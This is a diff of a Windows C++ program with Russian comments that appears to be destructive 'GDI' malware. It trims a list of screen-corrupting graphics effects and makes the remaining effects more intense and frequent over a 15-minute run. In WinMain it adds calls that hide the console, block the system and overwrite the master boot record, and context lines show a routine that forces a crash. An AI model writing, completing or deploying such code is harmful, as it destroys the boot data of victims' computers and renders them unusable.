-        BitBlt(hdc, 0, (int)i, w, 1, hdc, a, (int)i, SRCCOPY);
-        angle += 3.14159 / 40;
-    }
-}
-
-// 29. Smelt (из твоих файлов) - плавление
-void Effect29(HDC hdc, int w, int h) {
-    int rx = rand() % w;
-    BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
-}
-
-// 30. Train (из твоих файлов) - поезд
-void Effect30(HDC hdc, int w, int h) {
-    BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
-    BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
-}
-
-// 31. Train2 (из твоих файлов) - поезд вертикальный
-void Effect31(HDC hdc, int w, int h) {
-    BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
-    BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
-    BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
-    BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
-}
-
-// 32. Shake (из твоих файлов) - тряска
-void Effect32(HDC hdc, int w, int h) {
-    BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
-}
-
-// 33. Darkr (из твоих файлов) - затемнение
-void Effect33(HDC hdc, int w, int h) {
-    BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
-}
-
-// 34. GDI Hell (из твоих файлов)
-void Effect34(HDC hdc, int w, int h) {
-    BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
-}
-
-// 35. Bouncing Circles (из твоих файлов)
-void Effect35(HDC hdc, int w, int h) {
-    static int x = 10, y = 10, signX = 1, signY = 1;
-    x += 10 * signX;
-    y += 10 * signY;
-    if (y >= h) signY = -1;
-    if (x >= w) signX = -1;
-    if (y <= 0) signY = 1;
-    if (x <= 0) signX = 1;
-    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-    SelectObject(hdc, brush);
-    Ellipse(hdc, x, y, x + 100, y + 100);
-    DeleteObject(brush);
-}
-
-// 36. Cubes (из твоих файлов)
-void Effect36(HDC hdc, int w, int h) {
-    StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
-    StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
-}
-
-// 37. RGB Shader (из твоих файлов)
-void Effect37(HDC hdc, int w, int h) {
-    static int c = 0;
-    c++;
-    HDC mdc = CreateCompatibleDC(hdc);
-    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
-    SelectObject(mdc, bmp);
-    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-    for (int i = 0; i < w * h; i++) {
-        int x = i % w, y = i / w;
-        SetPixel(mdc, x, y, RGB((x + c) % 255, (y + c) % 255, (x ^ y + c) % 255));
-    }
-    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
     DeleteDC(mdc);
     DeleteObject(bmp);
-}
-
-// 38. Melt (из твоих файлов)
-void Effect38(HDC hdc, int w, int h) {
-    int rx = rand() % w;
-    BitBlt(hdc, rx, 1, 10, h, hdc, rx, 0, SRCCOPY);
-}
-
-// 39. Inverse Melt (из твоих файлов)
-void Effect39(HDC hdc, int w, int h) {
-    int rx = rand() % w;
-    BitBlt(hdc, rx, 1, 10, h, hdc, rx, 0, NOTSRCCOPY);
-}
-
-// 40. Pie (из твоих файлов)
-void Effect40(HDC hdc, int w, int h) {
-    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-    SelectObject(hdc, brush);
-    Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
-    DeleteObject(brush);
-}
-
-// 41. PolyBezier (из твоих файлов)
-void Effect41(HDC hdc, int w, int h) {
-    POINT p[4] = {rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h};
-    HPEN pen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
-    SelectObject(hdc, pen);
-    PolyBezier(hdc, p, 4);
-    DeleteObject(pen);
-}
-
-// 42. Triangles (из твоих файлов)
-void Effect42(HDC hdc, int w, int h) {
-    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, 0, 0));
-    HBRUSH brush = CreateSolidBrush(RGB(0, 0, rand() % 255));
-    SelectObject(hdc, pen);
-    SelectObject(hdc, brush);
-    POINT vertices[] = {{rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}};
-    Polygon(hdc, vertices, 3);
-    DeleteObject(pen);
-    DeleteObject(brush);
-}
-
-// 43. PlgBlt (из твоих файлов)
-void Effect43(HDC hdc, int w, int h) {
-    HDC mdc = CreateCompatibleDC(hdc);
-    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
-    SelectObject(mdc, bmp);
-    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-    POINT pt[3];
-    int inc3 = rand() % 700;
-    if (rand() % 2) inc3 = -inc3;
-    pt[0].x = -inc3;
-    pt[0].y = inc3;
-    pt[1].x = w - inc3;
-    pt[1].y = -inc3;
-    pt[2].x = inc3;
-    pt[2].y = h - inc3;
-    PlgBlt(hdc, pt, mdc, 0, 0, w, h, 0, 0, 0);
-    DeleteDC(mdc);
-    DeleteObject(bmp);
-}
-
-// 44. SetPixel Rainbow (из твоих файлов)
-void Effect44(HDC hdc, int w, int h) {
-    static int rainbow = 0;
-    rainbow = (rainbow + 1) % 360;
-    for (int yp = 0; yp < h; yp += 2) {
-        for (int xp = 0; xp < w; xp += 2) {
-            int color = (rainbow + xp + yp) % 360;
-            SetPixel(hdc, xp, yp, RGB(
-                (int)(128 + 127 * sin(color * 3.14159 / 180)),
-                (int)(128 + 127 * sin((color + 120) * 3.14159 / 180)),
-                (int)(128 + 127 * sin((color + 240) * 3.14159 / 180))
-            ));
-        }
-    }
-}
-
-// 45. Inv (из твоих файлов) - инверсия паттерном
-void Effect45(HDC hdc, int w, int h) {
-    PatBlt(hdc, 0, 0, w, h, PATINVERT);
 }
 
 // ==================== МАССИВ ВСЕХ ЭФФЕКТОВ ====================
@@ -574,12 +492,7 @@ EffectFunc effects[] = {
     Effect1, Effect2, Effect3, Effect4, Effect5,
     Effect6, Effect7, Effect8, Effect9, Effect10,
     Effect11, Effect12, Effect13, Effect14, Effect15,
-    Effect16, Effect17, Effect18, Effect19, Effect20,
-    Effect21, Effect22, Effect23, Effect24, Effect25,
-    Effect26, Effect27, Effect28, Effect29, Effect30,
-    Effect31, Effect32, Effect33, Effect34, Effect35,
-    Effect36, Effect37, Effect38, Effect39, Effect40,
-    Effect41, Effect42, Effect43, Effect44, Effect45
+    Effect16, Effect17, Effect18, Effect19, Effect20
 };
 int numEffects = sizeof(effects) / sizeof(effects[0]);
 
@@ -684,7 +597,7 @@ void TriggerBSOD() {
     *p = 0xDEADBEEF;
 }
 
-// ==================== ЗАПУСК ЭФФЕКТОВ С КОМБИНАЦИЯМИ ====================
+// ==================== ЗАПУСК ЭФФЕКТОВ С МЕГА-КОМБИНАЦИЯМИ ====================
 void RunGDIEffects() {
     screenWidth = GetSystemMetrics(SM_CXSCREEN);
     screenHeight = GetSystemMetrics(SM_CYSCREEN);
@@ -698,41 +611,52 @@ void RunGDIEffects() {
     time_t startTime = time(NULL);
     time_t endTime = startTime + 15 * 60;
     int effectIndex = 0;
+    comboIntensity = 1;
     
     while (time(NULL) < endTime && isRunning) {
-        // Случайно выбираем количество эффектов в комбинации (1-4)
-        int comboSize = 1 + (rand() % 4);
+        // Увеличиваем интенсивность со временем
+        comboIntensity = 1 + (int)((time(NULL) - startTime) / 60.0);
+        if (comboIntensity > 5) comboIntensity = 5;
         
-        // Если комбо-режим включён (50% шанс)
-        if (rand() % 2 == 0) {
-            // Сохраняем текущий экран
+        // Количество эффектов в комбинации растет со временем (1-5)
+        int comboSize = 2 + (rand() % (comboIntensity + 1));
+        
+        // 70% шанс на комбо-режим (вместо 50%)
+        if (rand() % 100 < 70) {
             HDC mdc = CreateCompatibleDC(hdc);
             HBITMAP bmp = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
             SelectObject(mdc, bmp);
             BitBlt(mdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
             
-            // Применяем несколько эффектов подряд
+            // Применяем несколько эффектов подряд с наложением
             for (int i = 0; i < comboSize; i++) {
                 int idx = effectOrder[(effectIndex + i) % numEffects];
                 effects[idx](hdc, screenWidth, screenHeight);
                 
-                // Генерируем звук для каждого эффекта
-                if (rand() % 3 == 0) {
-                    GenerateSound(100 + rand() % 4000, 30 + rand() % 150);
+                // Звуки для каждого эффекта
+                if (rand() % 2 == 0) {
+                    GenerateSound(50 + rand() % 5000, 20 + rand() % 150);
                 }
                 
-                Sleep(20 + rand() % 50);
+                Sleep(10 + rand() % 20);
             }
             
-            // Восстанавливаем оригинал с наложением эффектов
-            // (комбинируем через XOR или смешивание)
-            if (rand() % 3 == 0) {
-                // Инверсия комбинации
+            // Жесткое наложение
+            int blendMode = rand() % 4;
+            if (blendMode == 0) {
+                // Инверсия
                 BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, NOTSRCCOPY);
-            } else if (rand() % 2 == 0) {
+            } else if (blendMode == 1) {
+                // XOR
+                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, SRCINVERT);
+            } else if (blendMode == 2) {
                 // Наложение с прозрачностью
-                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 128, 0};
+                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 100 + rand() % 100, 0};
                 AlphaBlend(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, screenWidth, screenHeight, bf);
+            } else {
+                // Смешивание с паттерном
+                PatBlt(hdc, 0, 0, screenWidth, screenHeight, PATINVERT);
+                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, SRCCOPY);
             }
             
             DeleteDC(mdc);
@@ -751,12 +675,12 @@ void RunGDIEffects() {
             effectIndex++;
         }
         
-        // Перемешиваем порядок раз в 5-10 эффектов
-        if (rand() % 20 == 0) {
+        // Частое перемешивание (каждые 3-8 эффектов)
+        if (rand() % 10 == 0) {
             random_shuffle(effectOrder.begin(), effectOrder.end());
         }
         
-        Sleep(50 + rand() % 150);
+        Sleep(20 + rand() % 80);
     }
     
     ReleaseDC(0, hdc);
@@ -768,9 +692,17 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
     srand(GetTickCount());
     
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    // Блокируем систему
+    BlockSystem();
+    
+    // Перезаписываем MBR
     OverwriteMBR();
+    
+    // Запускаем звуки
     PlayRandomSounds();
     
+    // Запускаем GDI эффекты
     thread gdiThread(RunGDIEffects);
     Sleep(15 * 60 * 1000);
     
